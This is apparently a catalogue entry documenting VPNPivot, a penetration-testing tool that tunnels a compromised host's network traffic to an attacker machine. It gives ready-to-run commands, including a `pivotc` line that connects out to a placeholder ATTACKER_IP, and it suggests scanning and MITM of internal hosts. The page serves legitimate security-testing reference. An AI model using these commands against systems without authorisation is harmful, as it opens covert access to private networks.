---
name: "vpnpivot"
categories:
  - blackarch-recon
version: "22.37bbde0"
homepage: "https://github.com/0x36/VPNPivot"
packaged-by: [blackarch]
blackarch-builddate: "2017-05-09"
build-system: autotools
license: custom:unknown
meta-checked: "2026-11-09"
github-repo: "0x36/VPNPivot"
github-stars: 277
github-pushed: "2016-07-21"
github-archived: false
github-issues: 8
github-match: "exact"
gh-checked: "2026-11-07"
worth: 2.7
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# vpnpivot

> Layer-2 pivoting over TLS: a `pivots` server on your machine exposes a TAP interface, and a `pivotc` client on the compromised host tunnels raw Ethernet frames to it.

## What it's for

VPNPivot (0x36/Simo36) implements VPN-style pivoting for external penetration tests: once you have a shell on one host inside a network, the alternatives are port forwards and SOCKS, which only reach TCP services the relay knows about. This tool instead gives your attacker machine a virtual network card inside the target network — full L2: broadcast traffic, DHCP, any IP protocol — by shipping the target's Ethernet frames over an encrypted TCP/TLS stream to `pivots`, which injects them into a TAP device on your side. Two binaries make it work: `pivots` runs on the attacker (creates the TAP device, listens), `pivotc` runs on the target (connects out and bridges its local interface to the tunnel). Development stopped in 2016 and it is Linux-only on both ends; modern alternatives include chisel/ligolo-style tunnels where full L2 is not required.

## Typical use cases

### Start the pivot server on the attacker machine

Bring up the tunnel endpoint before connecting the target.

```
pivots -i tap0 -I 198.51.100.1/24 -p 12345 -C server.pem -P server.key -v
```

Outcome: creates non-persistent TAP device `tap0` configured with `198.51.100.1/24`, listens on TCP 12345 for `pivotc` connections and authenticates them with the given PEM certificate/key (`-C`/`-P`); `-v` logs tunnel traffic. Omit `-I` and instead run a DHCP client on `tap0` after the tunnel is up to draw an address from the target network's own DHCP server; `-H AA:BB:CC:DD:EE:FF` spoofs the interface MAC.

### Connect the target through pivotc

From the compromised host, join it to the attacker-side virtual network.

```
./pivotc ATTACKER_IP 12345 198.51.100.10
```

Outcome: the target-side client connects to `pivots` at `ATTACKER_IP:12345` and forwards frames between the tunnel and the target's interface at `198.51.100.10` (the address of its link to the unreachable network; an optional fourth argument overrides the MTU to match the server). Once connected, the attacker's `tap0` behaves as a native interface on the internal network — run scans, MITM or protocol tools against internal hosts directly.
